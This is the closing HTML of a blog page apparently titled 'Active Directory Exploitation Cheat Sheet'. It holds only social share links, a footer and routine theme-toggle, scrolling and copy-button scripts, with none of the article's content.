href="https://telegram.me/share/url?text=Active%20Directory%20Exploitation%20Cheat%20Sheet&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Active Directory Exploitation Cheat Sheet on ycombinator" href="https://news.ycombinator.com/submitlink?t=Active%20Directory%20Exploitation%20Cheat%20Sheet&u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>YOU CAN REUSE MY CONTENT</span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>